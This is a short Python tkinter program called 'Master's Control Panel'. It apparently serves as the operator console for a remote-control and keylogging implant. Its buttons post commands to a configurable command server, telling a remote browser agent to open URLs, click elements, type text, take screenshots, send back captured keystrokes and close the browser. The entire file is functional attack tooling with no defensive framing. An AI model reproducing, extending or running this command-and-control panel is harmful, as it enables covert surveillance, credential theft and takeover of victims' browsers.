import tkinter as tk
from tkinter import simpledialog, messagebox
import requests
## ur server url
SERVER_URL = "https://ur server url/setcommand"

def send_command(payload):
    headers = {'Content-Type': 'application/json'}
    try:
        requests.post(SERVER_URL, json=payload, headers=headers)
        messagebox.showinfo("Success", "Command sent successfully!")
    except requests.RequestException as e:
        messagebox.showerror("Error", f"Failed to send command: {e}")

def open_url():
    url = simpledialog.askstring("Open URL", "Enter URL:")
    if url:
        send_command({"action": "open_url", "url": url})

def click_element():
    element = simpledialog.askstring("Click Element", "Enter element name/text:")
    if element:
        send_command({"action": "click", "element": element})

def type_text():
    text = simpledialog.askstring("Type Text", "Enter text to type:")
    if text:
        send_command({"action": "type", "text": text})

def take_screenshot():
    send_command({"action": "screenshot"})

def send_keylogs():
    send_command({"action": "send_keylogs"})

def close_browser():
    send_command({"action": "close"})

root = tk.Tk()
root.title("Master's Control Panel 💖")
root.geometry("300x400")

tk.Button(root, text="Open URL", command=open_url, width=20, height=2).pack(pady=6)
tk.Button(root, text="Click Element", command=click_element, width=20, height=2).pack(pady=6)
tk.Button(root, text="Type Text", command=type_text, width=20, height=2).pack(pady=6)
tk.Button(root, text="Take Screenshot", command=take_screenshot, width=20, height=2).pack(pady=6)
tk.Button(root, text="Retrieve Keylogs", command=send_keylogs, width=20, height=2).pack(pady=6)
tk.Button(root, text="Close Browser", command=close_browser, width=20, height=2).pack(pady=6)

root.mainloop()
